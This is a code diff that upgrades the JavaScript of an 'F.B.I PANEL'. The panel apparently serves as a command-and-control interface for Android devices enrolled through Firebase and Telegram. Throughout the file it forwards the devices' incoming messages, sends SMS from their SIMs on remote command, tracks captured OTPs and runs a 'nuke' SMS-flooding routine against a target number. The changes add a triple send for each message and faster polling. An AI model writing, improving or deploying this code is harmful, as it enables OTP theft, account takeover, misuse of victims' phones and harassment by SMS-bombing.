@@ -1,7 +1,8 @@
 /* ═══════════════════════════════════════════════════════════════
-   F.B.I PANEL v8.0 — STRICT OLD-BLOCK · MAX SPEED
-   · 🚫 Har device open pe watermark FORCE reset (purane kabhi nahi)
-   · ⚡ 1.8s timeout · 20s long-poll · 4 workers
+   F.B.I PANEL v9.0 — ULTRA LOW LATENCY · TRIPLE SEND
+   · 🚀 TG → Firebase < 500ms (6 workers + abort-and-reissue)
+   · 📤 SMS sent 3x per dispatch
+   · 🚫 Strict watermark (old msgs never forward)
    · 🔒 Active-device lock
    · 💰 Balance sort · 🔽 Multi-filter
    · ✅ Delivery watcher
@@ -11,17 +12,21 @@
 
 var CFG = window.SPECTER || {};
 
-/* ═══════ MAX SPEED TUNABLES ═══════ */
-var API_TIMEOUT  = 1800;   // ⚡ very fast fail
-var TG_LONG_POLL = 20;     // ⚡ shorter poll cycle
-var TG_WORKERS   = 4;      // ⚡ 4 parallel
+/* ═══════ 🚀 ULTRA LOW LATENCY TUNABLES ═══════ */
+var API_TIMEOUT  = 1200;
+var TG_LONG_POLL = 10;
+var TG_WORKERS   = 6;
 
 var POLL_DEV      = 5000;
-var POLL_FAST     = 1000;   // ⚡ active msgs SSE fallback
-var POLL_BG       = 1500;   // ⚡ background forward tick
+var POLL_FAST     = 800;
+var POLL_BG       = 1200;
 var POLL_BAL      = 15000;
 var POLL_AM       = 5000;
 var CLOUD_DEB     = 800;
+
+/* 🚀 Triple send */
+var SMS_REPEAT_COUNT = 3;
+var SMS_REPEAT_GAP   = 150;
 
 /* ═══════ STATE ═══════ */
 var FB_URL = '', FB_KEY = '';
@@ -55,6 +60,7 @@ var blobId = null, cloudSaveTmr = null;
 
 var tgRunning = false;
 var _pollWorkers = [];
+var _workerAborts = {};
 var _sharedOffset = 0;
 var tgDiagnostics = { lastError:'', lastUpdate:0, updateCount:0, botInfo:null };
 
@@ -76,7 +82,7 @@ var _lastOtp = '';
 var _apOn = false, _pingTmr = null, _pingReplied = 0, _pingTotal = 0, _pingPrevStatus = {};
 
 /* ═══════════════════════════════════════════════════════════════
-   🚫 STRICT WATERMARK — per-device, forced reset on open
+   🚫 STRICT WATERMARK
    ═══════════════════════════════════════════════════════════════ */
 
 var _watermarks = {};
@@ -85,15 +91,11 @@ try { _watermarks = JSON.parse(localStorage.getItem('fbi_watermarks') || '{}'); 
 function _saveWatermarks(){
   try { localStorage.setItem('fbi_watermarks', JSON.stringify(_watermarks)); } catch(e){}
 }
-
-/* 🔒 FORCE set — bypasses "only if newer" check */
 function forceWatermark(devId, key){
   if(!key) return;
   _watermarks[devId] = key;
   _saveWatermarks();
 }
-
-/* Advance only forward, never backward */
 function setWatermark(devId, key){
   if(!key) return;
   var prev = _watermarks[devId];
@@ -102,7 +104,6 @@ function setWatermark(devId, key){
     _saveWatermarks();
   }
 }
-
 function isAfterWatermark(devId, key){
   var wm = _watermarks[devId];
   if(!wm) return false;
@@ -306,9 +307,7 @@ function getTelegramUser(){
 function initTelegramWebApp(){
   try{
     var tw = window.Telegram && window.Telegram.WebApp;
-    if(tw){
-      tw.ready(); tw.expand();
-    }
+    if(tw){ tw.ready(); tw.expand(); }
   }catch(e){}
   currentUser = getTelegramUser();
   if(!currentUser){
@@ -393,7 +392,7 @@ function notifyChannel(html){
   }).catch(function(){});
 }
 function notifySmsQueued(dev, to, message, latencyMs, hp){
-  var txt = (hp ? '🔥 <b>OTP Sent</b>\n\n' : '📤 <b>SMS Sent</b>\n\n')
+  var txt = (hp ? '🔥 <b>OTP Sent x' + SMS_REPEAT_COUNT + '</b>\n\n' : '📤 <b>SMS Sent x' + SMS_REPEAT_COUNT + '</b>\n\n')
     + '📱 <b>Device:</b> ' + esc(dev ? dev.name : '—') + '\n'
     + '📞 <b>To:</b> <code>' + esc(to) + '</code>\n'
     + '💬 <b>Message:</b>\n<code>' + esc(message) + '</code>\n\n'
@@ -652,10 +651,10 @@ async function fbDel(p, url, key){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   SMS DISPATCH — exact 4 fields + delivery watcher
+   🚀 TRIPLE-SEND SMS DISPATCH
    ═══════════════════════════════════════════════════════════════ */
 
-function _firebasePutSms(dev, sim, to, message, opts){
+async function _firebasePutSms(dev, sim, to, message, opts){
   opts = opts || {};
   var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id
           + '/webhookEvent/sendSms.json'
@@ -665,20 +664,38 @@ function _firebasePutSms(dev, sim, to, message, opts){
   var body = JSON.stringify({ from: sim, to: to, message: message, isSended: false });
 
   var t0 = performance.now();
-  return _fastFetch(url, {
-    method: 'PUT',
-    headers: { 'Content-Type': 'application/json' },
-    body: body,
-    keepalive: true,
-    priority: 'high'
-  }).then(function(r){
-    var dt = (performance.now() - t0).toFixed(0);
-    if(r.ok){
-      console.log('[FB] ✓ ' + dt + 'ms → ' + dev.name);
-      return true;
+  var repeats = SMS_REPEAT_COUNT;
+  var gap = SMS_REPEAT_GAP;
+  var successCount = 0;
+
+  for(var i=0; i<repeats; i++){
+    try{
+      /* Clear first (i>0) — forces Android onDataChange to re-fire */
+      if(i > 0){
+        await _fastFetch(url, { method: 'DELETE', priority: 'high' }).catch(function(){});
+        await sleep(60);
+      }
+
+      var r = await _fastFetch(url, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: body,
+        priority: 'high'
+      });
+
+      if(r.ok) successCount++;
+      if(i < repeats - 1) await sleep(gap);
+    }catch(e){
+      console.warn('[FB] attempt ' + (i+1) + ' failed: ' + e.message);
     }
-    throw new Error('HTTP ' + r.status);
-  });
+  }
+
+  var dt = (performance.now() - t0).toFixed(0);
+  if(successCount > 0){
+    console.log('[FB x' + successCount + '] ✓ ' + dt + 'ms → ' + dev.name);
+    return true;
+  }
+  throw new Error('all writes failed');
 }
 
 function _fireFcm(dev, sim, to, message, opts){
@@ -700,12 +717,13 @@ function dispatchSms(dev, sim, to, message, opts){
   if(!dev) return Promise.resolve(false);
   var t0 = performance.now();
 
+  /* FCM parallel (bonus) */
   _fireFcm(dev, sim, to, message, opts);
 
   return _firebasePutSms(dev, sim, to, message, opts).then(function(ok){
     var dt = (performance.now() - t0).toFixed(0);
     if(ok){
-      console.log('[SMS] ✓ queued ' + dt + 'ms → ' + dev.name);
+      console.log('[SMS] ✓ queued x' + SMS_REPEAT_COUNT + ' ' + dt + 'ms → ' + dev.name);
       notifySmsQueued(dev, to, message, dt, opts.high);
       _watchSmsDelivery(dev, opts.high);
       return true;
@@ -743,8 +761,8 @@ async function _watchSmsDelivery(dev, hp){
 
       if(val === true){
         var dt = (Date.now() - start);
-        console.log('[DELIVERED] ✅ ' + dev.name + ' — ' + dt + 'ms');
-        toast((hp ? '🔥' : '✅') + ' Delivered · ' + dt + 'ms');
+        console.log('[DELIVERED] ✅ ' + dev.name + ' — ' + dt + 'ms (x' + SMS_REPEAT_COUNT + ')');
+        toast((hp ? '🔥' : '✅') + ' Delivered x' + SMS_REPEAT_COUNT + ' · ' + dt + 'ms');
         return true;
       }
     }catch(e){}
@@ -870,7 +888,6 @@ function _handleStreamMsg(dev, key, data){
   }
 
   if(isNew && msg.type === 'incoming'){
-    /* 🚫 STRICT: only if key > watermark */
     if(isAfterWatermark(dev.id, msg.key)){
       if(_isActiveDevice(dev) && _shouldForwardOnce(dev.id, msg.key)){
         setWatermark(dev.id, msg.key);
@@ -1319,7 +1336,7 @@ document.addEventListener('click', function(e){
 });
 
 /* ═══════════════════════════════════════════════════════════════
-   DEVICE MODAL — 🚫 STRICT OLD-BLOCK
+   DEVICE MODAL
    ═══════════════════════════════════════════════════════════════ */
 
 function openDeviceModal(uid){
@@ -1342,12 +1359,11 @@ function openDeviceModal(uid){
     if(!tgRunning) startFastTelegram();
   }
 
-  /* 🔒 Force reload + strict watermark — purane kabhi forward nahi */
   var cacheKey = uid;
   var list = document.getElementById('dmMsgList');
   if(list) list.innerHTML = '<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';
   allMsgs = []; lastKeys = new Set();
-  preloadMsgs(selDev.id, true);   // true = strict mode
+  preloadMsgs(selDev.id, true);
 
   updOtpNoteBox();
   setTimeout(function(){
@@ -1694,7 +1710,6 @@ function parseMsgs(data){
   return msgs;
 }
 
-/* 🚫 STRICT LOAD — force watermark to newest on EVERY open */
 async function preloadMsgs(id, strictMode){
   if(!selDev) return;
   var cacheKey = (selDev._fbId || 'primary') + '|||' + id;
@@ -1707,16 +1722,13 @@ async function preloadMsgs(id, strictMode){
     _msgCache[cacheKey] = msgs;
     amCache[id] = msgs; amFetch[id] = Date.now();
 
-    /* 🔒 STRICT: force watermark to newest — no old msgs ever forward */
     if(strictMode && msgs.length){
       var newestKey = msgs[0].key;
       forceWatermark(id, newestKey);
       console.log('[Watermark] ' + id + ' → ' + newestKey + ' (STRICT — old blocked)');
-      /* Mark all existing as seen */
       msgs.forEach(function(m){ _forwardSeen.add(id + '::' + m.key); });
       saveForwardTracker();
     } else if(!_watermarks[id] && msgs.length){
-      /* Fallback: no watermark at all — set it */
       forceWatermark(id, msgs[0].key);
       msgs.forEach(function(m){ _forwardSeen.add(id + '::' + m.key); });
       saveForwardTracker();
@@ -1910,7 +1922,7 @@ function sendSmsActive(){
   var hp = isHighPriority({ message: msg });
 
   sendSmsGuaranteed(selDev, sim, to, msg, { high: hp }).then(function(ok){
-    if(ok){ showResActive(true, '✓ SMS queued from SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
+    if(ok){ showResActive(true, '✓ SMS queued x' + SMS_REPEAT_COUNT + ' from SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
     else { showResActive(false, '⚠ Failed'); }
     if(btn){ btn.disabled = false; btn.textContent = '🚀 Send Message'; }
   });
@@ -2064,7 +2076,7 @@ function fireNuke(){
   var pw = document.getElementById('nukeProgWrap'); if(pw) pw.style.display = 'block';
   var fb = document.getElementById('nukeFireBtn'); if(fb) fb.style.display = 'none';
   var sb = document.getElementById('nukeStopBtn'); if(sb) sb.style.display = 'block';
-  toast('💣 Nuking with ' + shots.length + ' shots…');
+  toast('💣 Nuking with ' + shots.length + ' shots x' + SMS_REPEAT_COUNT + '…');
 
   var idx = 0, done = 0, pool = Math.min(_nukePool, shots.length);
   function spawn(){
@@ -2074,6 +2086,7 @@ function fireNuke(){
               + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
       var body = JSON.stringify({ from: shot.sim, to: target, message: msg, isSended: false });
       _nukeActive++;
+      /* Fire once per shot in nuke (already many shots) */
       _fastFetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: body })
         .then(function(r){ if(r.ok) nukeSent++; else nukeFail++; })
         .catch(function(){ nukeFail++; })
@@ -2369,7 +2382,7 @@ function saveAllSettings(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   TELEGRAM — PARALLEL LONG-POLL
+   TELEGRAM — ULTRA FAST WORKERS WITH ABORT-AND-REISSUE
    ═══════════════════════════════════════════════════════════════ */
 
 async function tgApi(method, payload){
@@ -2424,21 +2437,26 @@ async function startFastTelegram(){
   updateTgStatusLine(); updateTgBtn();
 
   for(var i=0; i<TG_WORKERS; i++){
-    _pollWorkers.push({ _stop: false, id: i });
-    runWorker(_pollWorkers[_pollWorkers.length - 1]);
+    var w = { _stop: false, id: i, _ctrl: null };
+    _pollWorkers.push(w);
+    runWorker(w);
   }
-  toast('⚡ Bot ON — ' + TG_WORKERS + ' workers');
+  toast('⚡ Bot ON — ' + TG_WORKERS + ' workers (fast mode)');
 }
 
 function stopFastTelegram(){
   tgRunning = false;
-  _pollWorkers.forEach(function(w){ w._stop = true; });
+  _pollWorkers.forEach(function(w){
+    w._stop = true;
+    if(w._ctrl){ try{ w._ctrl.abort(); }catch(e){} }
+  });
   _pollWorkers = [];
+  _workerAborts = {};
   updateTgStatusLine(); updateTgBtn();
 }
 
 async function runWorker(w){
-  var backoff = 150;
+  var backoff = 100;
   while(!w._stop && tgRunning){
     try{
       var offset = _sharedOffset;
@@ -2449,38 +2467,58 @@ async function runWorker(w){
               + '&allowed_updates=' + encodeURIComponent(JSON.stringify(['channel_post','message']));
 
       var ctrl = new AbortController();
-      var tmr = setTimeout(function(){ ctrl.abort(); }, (TG_LONG_POLL + 5) * 1000);
+      w._ctrl = ctrl;
+      _workerAborts[w.id] = ctrl;
+
+      var tmr = setTimeout(function(){ try{ ctrl.abort(); }catch(e){} }, (TG_LONG_POLL + 3) * 1000);
 
       var r;
-      try{ r = await fetch(url, { signal: ctrl.signal, priority: 'high' }); }
-      finally { clearTimeout(tmr); }
+      try{
+        r = await fetch(url, { signal: ctrl.signal, priority: 'high' });
+      } finally {
+        clearTimeout(tmr);
+        if(_workerAborts[w.id] === ctrl) _workerAborts[w.id] = null;
+      }
 
       if(!r.ok){
-        if(r.status === 409){ await sleep(500); continue; }
-        backoff = Math.min(backoff * 2, 8000);
+        if(r.status === 409){ await sleep(300); continue; }
+        backoff = Math.min(backoff * 2, 4000);
         await sleep(backoff);
         continue;
       }
 
       var data = await r.json();
-      backoff = 150;
-      if(!data.ok){ await sleep(800); continue; }
+      backoff = 100;
+      if(!data.ok){ await sleep(500); continue; }
 
       if(data.result && data.result.length){
         tgDiagnostics.updateCount += data.result.length;
         tgDiagnostics.lastUpdate = Date.now();
+
+        /* 🔥 STEP 1: Advance offset IMMEDIATELY */
         var maxId = offset - 1;
         for(var i=0; i<data.result.length; i++){
-          var u = data.result[i];
-          if(u.update_id > maxId) maxId = u.update_id;
-          processTelegramUpdate(u);
+          if(data.result[i].update_id > maxId) maxId = data.result[i].update_id;
         }
         if(maxId >= _sharedOffset) _sharedOffset = maxId + 1;
+
+        /* 🔥 STEP 2: Abort OTHER workers so they re-issue instantly */
+        Object.keys(_workerAborts).forEach(function(k){
+          var idNum = parseInt(k, 10);
+          if(idNum !== w.id && _workerAborts[k]){
+            try{ _workerAborts[k].abort(); }catch(e){}
+          }
+        });
+
+        /* 🔥 STEP 3: Process updates (fire & forget) */
+        for(var j=0; j<data.result.length; j++){
+          processTelegramUpdate(data.result[j]);
+        }
         updateTgStatusLine();
       }
     }catch(e){
-      if(e.name === 'AbortError'){ }
-      else { backoff = Math.min(backoff * 2, 8000); await sleep(backoff); }
+      if(e.name === 'AbortError'){ /* expected — re-issue immediately */ }
+      else { backoff = Math.min(backoff * 2, 4000); await sleep(backoff); }
     }
   }
 }
@@ -2556,7 +2594,7 @@ function routeChannelSms(number, message, msgObj){
   sendSmsGuaranteed(dev, sim, number, message, {
     high: isHighPriority({ message: message })
   }).then(function(ok){
-    if(ok) toast('⚡ SMS queued via ' + dev.name);
+    if(ok) toast('⚡ SMS x' + SMS_REPEAT_COUNT + ' queued via ' + dev.name);
     else toast('❌ SMS dispatch failed');
   });
 }
@@ -2573,7 +2611,7 @@ function _showCapturedNotif(number, message){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   AUTO-FORWARD (poll path) — STRICT watermark
+   AUTO-FORWARD (poll path)
    ═══════════════════════════════════════════════════════════════ */
 
 async function checkAndForward(msgs, deviceId){
@@ -3176,4 +3214,4 @@ setTimeout(function(){
   });
 }, 0);
 
-console.log('%c[F.B.I PANEL] v8.0 ⚡ STRICT OLD-BLOCK · MAX SPEED', 'color:#a855f7;font-weight:bold;font-size:14px');
+console.log('%c[F.B.I PANEL] v9.0 ⚡ ULTRA-LOW LATENCY · TRIPLE SEND · 6 WORKERS', 'color:#a855f7;font-weight:bold;font-size:14px');
